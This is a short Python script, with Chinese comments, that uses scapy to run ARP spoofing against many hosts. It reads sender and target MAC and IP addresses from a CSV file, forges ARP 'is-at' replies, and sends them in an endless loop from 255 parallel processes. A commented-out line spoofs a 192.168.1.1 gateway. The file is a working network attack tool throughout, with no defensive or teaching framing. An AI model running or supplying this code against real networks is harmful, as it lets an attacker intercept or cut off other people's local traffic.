from multiprocessing import Pool
from scapy.all import *
# eth=Ether()
# arp=ARP(op="is-at",psrc="192.168.1.1",hwsrc="aa:aa:aa:aa:aa:aa")
# sendp(eth/arp, inter=1, loop=1)
IPADDR_FILE_PATH='./iplist.csv'

#触发一次ARP欺骗
def sent_arp(addr):
	addr=addr.split(',')
	sender_hwsrc=addr[0]
	sender_psrc=addr[1]
	target_hwdst=addr[2]
	target_pdst=addr[3]
	arp=ARP(op='is-at',hwsrc=sender_hwsrc,psrc=sender_psrc,hwdst=target_hwdst,pdst=target_pdst)
	eth=Ether(dst=target_hwdst,src=sender_hwsrc)
	sendp(eth/arp, inter=1, loop=1)

#多进程并发
def load_proc(addr_file):
	addr_list=[]
	for line in addr_file:
		if line.startswith('#'):
			pass
		else:
			addr_list.append(line.strip('\r\n'))
	p=Pool(255)	
	p.map(sent_arp, addr_list)
	p.close()
	p.join()

def main():
	stime=time.time()
	with open(IPADDR_FILE_PATH,'r') as addr_file:
		load_proc(addr_file)
	# print ('%.2f' %(time.time()-stime))

if __name__ == '__main__':
	main()



